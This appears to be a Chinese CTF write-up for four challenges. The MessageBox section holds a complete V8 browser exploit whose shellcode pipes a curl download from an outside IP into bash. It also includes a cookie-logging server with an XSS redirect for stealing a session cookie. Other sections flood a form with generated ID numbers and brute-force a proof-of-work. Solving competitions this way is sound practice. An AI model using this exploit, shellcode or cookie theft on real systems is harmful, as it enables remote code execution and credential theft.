# Writenup

## MessageBox

存在一个窗口，可以提交html、js代码，同时还会有bot来进行访问，猜测是Chrome的RCE，利用以下payload，反弹shell

```html
// exploit.html
<script>
    function gc() {
        for (var i = 0; i < 0x80000; ++i) {
            var a = new ArrayBuffer();
        }
    }
    let shellcode = [0x48,0xb8,0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x99,0x50,0x54,0x5f,0x52
,0x66,0x68,0x2d,0x63,0x54,0x5e,0x52,0xe8,0x2b,0x00,0x00,0x00,0x63,0x75,0x72
,0x6c,0x20,0x68,0x74,0x74,0x70,0x3a,0x2f,0x2f,0x31,0x30,0x31,0x2e,0x34,0x33
,0x2e,0x31,0x32,0x32,0x2e,0x32,0x35,0x32,0x3a,0x38,0x39,0x39,0x39,0x2f,0x31
,0x2e,0x74,0x78,0x74,0x7c,0x62,0x61,0x73,0x68,0x00,0x56,0x57,0x54,0x5e,0x6a
,0x3b,0x58,0x0f,0x05];
    var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11]);
    var wasmModule = new WebAssembly.Module(wasmCode);
    var wasmInstance = new WebAssembly.Instance(wasmModule);
    var main = wasmInstance.exports.main;
    var bf = new ArrayBuffer(8);
    var bfView = new DataView(bf);
    function fLow(f) {
        bfView.setFloat64(0, f, true);
        return (bfView.getUint32(0, true));
    }
    function fHi(f) {
        bfView.setFloat64(0, f, true);
        return (bfView.getUint32(4, true))
    }
    function i2f(low, hi) {
        bfView.setUint32(0, low, true);
        bfView.setUint32(4, hi, true);
        return bfView.getFloat64(0, true);
    }
    function f2big(f) {
        bfView.setFloat64(0, f, true);
        return bfView.getBigUint64(0, true);
    }
    function big2f(b) {
        bfView.setBigUint64(0, b, true);
        return bfView.getFloat64(0, true);
    }
    class LeakArrayBuffer extends ArrayBuffer {
        constructor(size) {
            super(size);
            this.slot = 0xb33f;
        }
    }
    function foo(a) {
        let x = -1;
        if (a) x = 0xFFFFFFFF;
        var arr = new Array(Math.sign(0 - Math.max(0, x, -1)));
        arr.shift();
        let local_arr = Array(2);
        local_arr[0] = 5.1;//4014666666666666
        let buff = new LeakArrayBuffer(0x1000);//byteLength idx=8
        arr[0] = 0x1122;
        return [arr, local_arr, buff];
    }
    for (var i = 0; i < 0x10000; ++i)
        foo(false);
    gc(); gc();
    [corrput_arr, rwarr, corrupt_buff] = foo(true);
    corrput_arr[12] = 0x22444;
    delete corrput_arr;
    function setbackingStore(hi, low) {
        rwarr[4] = i2f(fLow(rwarr[4]), hi);
        rwarr[5] = i2f(low, fHi(rwarr[5]));
    }
    function leakObjLow(o) {
        corrupt_buff.slot = o;
        return (fLow(rwarr[9]) - 1);
    }
    let corrupt_view = new DataView(corrupt_buff);
    let corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);
    let idx0Addr = corrupt_buffer_ptr_low - 0x10;
    let baseAddr = (corrupt_buffer_ptr_low & 0xffff0000) - ((corrupt_buffer_ptr_low & 0xffff0000) % 0x40000) + 0x40000;
    let delta = baseAddr + 0x1c - idx0Addr;
    if ((delta % 8) == 0) {
        let baseIdx = delta / 8;
        this.base = fLow(rwarr[baseIdx]);
    } else {
        let baseIdx = ((delta - (delta % 8)) / 8);
        this.base = fHi(rwarr[baseIdx]);
    }
    let wasmInsAddr = leakObjLow(wasmInstance);
    setbackingStore(wasmInsAddr, this.base);
    let code_entry = corrupt_view.getFloat64(13 * 8, true);
    setbackingStore(fLow(code_entry), fHi(code_entry));
    for (let i = 0; i < shellcode.length; i++) {
        corrupt_view.setUint8(i, shellcode[i]);
    }
    main();
</script>
```

获取到shell之后,bot.js的内容如下：

```js
const puppeteer = require('puppeteer')
const fs = require('fs')

exports.visit = async function () {
        const browser = await puppeteer.launch({ args: ['--no-sandbox'], product: 'chrome' })
        var page = await browser.newPage()
        await page.setCookie({
                name: 'flag',
                value: process.env.FLAG,
                domain: '127.0.0.1'
        })

        await page.goto("http://127.0.0.1/view")

        await new Promise(resolve => setTimeout(resolve, 500));
        await page.close()
        await browser.close()
}
```

那么创建一个node的服务，来记录请求

```js
const express = require('express');
const fs = require('fs');

const app = express();

app.get('/', (req, res) => {
  // 获取请求的 Cookie
  const cookies = req.headers.cookie;

  // 将 Cookie 写入文件
  fs.appendFile('cookies.txt', cookies + '\n', (err) => {
    if (err) {
      console.error('无法写入文件:', err);
    } else {
      console.log('Cookie 已写入文件');
    }
  });

  res.send('Cookie 已写入文件');
});

app.listen(3000, () => {
  console.log('服务器已启动，监听端口 3000');
});
```

在前端提交`<script>window.location.href="http://127.0.0.1:3000"</script>`，成功获取到

![image-20240414172155944](img/image-20240414172155944.png)

## 定向数据采集

提交1000份不重复数据后，再访问首页即可获得flag，脚本如下：

```python
import random
import requests
from Other.id_number import constant
from Other.id_number import identity


for i in range(0,1100):
    random_sex = random.randint(0,1)
    sex = "女"
    if random_sex:
        sex = "男"
    id = identity.IdNumber.generate_id(random_sex)
    print(id)
    age= identity.IdNumber(id).get_age()

    url = "http://121.40.65.125:22674/submit"
    cookies = {
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsb2dpbiI6ImZhbHNlIiwibmFtZSI6Imd1ZXN0IiwiaWF0IjoxNzEzMDc5ODI5LCJleHAiOjE3NDQ2MTU4Mjl9.5wm20dgMUzzZguskrYaSC_D1N1LlvWnAOybak7jClW0"}
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "Content-Type": "application/json;charset=UTF-8", "Accept": "*/*", "Origin": "http://121.40.65.125:22674",
        "Referer": "http://121.40.65.125:22674/", "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,zh-TW;q=0.8,en;q=0.7,en-US;q=0.6", "Connection": "close"}
    json = {"address": "123", "age": str(age), "ethnicity": "\xe6\xb1\x89", "experience": "123", "idcard": id,
            "name": "123", "phonenumber": "18631124100", "position": "123", "sex": sex}
    # print(json)
    r = requests.post(url, headers=headers, cookies=cookies, json=json)
    print(i, r.json().get("msg"))
```



## 幻方

通过暴力破解获取第一个sha256

```
import string, random
from hashlib import sha256
from pwn import *
import re


def deCry(tail, res):
    table = ''.join(string.ascii_letters + string.digits)
    for i in table:
        for j in table:
            for k in table:
                for l in table:
                    buf = i + j + k + l
                    if sha256((buf + tail).encode()).hexdigest() == res:
                        return buf


p = remote('121.40.65.125', 24379)
r = p.recvline()
res = re.split("==", r.decode().replace("\n", "").replace(" ", ""))
res1 = res[0].split("+")[2].replace(")", "")
r = deCry(res1, res[1])
p.sendline(r.encode())
print(p.recvline())
line1 = p.recvline().decode().replace("\n", "").split(" ")
line2 = p.recvline().decode().replace("\n", "").split(" ")
line3 = p.recvline().decode().replace("\n", "").split(" ")
print(line1, line2, line3)


def generate_magic_square(line1, line2, line3):
    # 创建一个 3x3 的幻方
    magic_square = [line1, line2, line3]

    for row in magic_square:
        if row.count("X") == 1:
            unKnow = int(row.index("X"))
            row[unKnow] = 15
            for i in range(0, 3):
                if i != unKnow:
                    row[unKnow] -= int(row[i])

    transpose = [[row[i] for row in magic_square] for i in range(len(magic_square[0]))]
    for row in transpose:
        if row.count("X") == 1:
            unKnow = int(row.index("X"))
            row[unKnow] = 15
            for i in range(0, 3):
                if i != unKnow:
                    row[unKnow] -= int(row[i])
    result = [[row[i] for row in transpose] for i in range(len(transpose[0]))]
    print(result)
    return result


# 生成幻方
magic_square = generate_magic_square(line1, line2, line3)
print(magic_square)
a = ""
for row in magic_square:
    a += " ".join(str(num) for num in row)
    a += "\n"

print(a.encode())
p.sendline(a.encode())
print(p.recvline())
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
print(p.recvline().decode())
```

## Pyc

![9](img/clip_image001.jpg)

反编译得到python代码发现就是固定随机数进行异或，直接将flag.enc写进去重新加密出来

```
file_path = r'E:\系统\桌面\flag.enc'

encrypt_file(file_path)
```

得到flag

![img](img/clip_image003.jpg)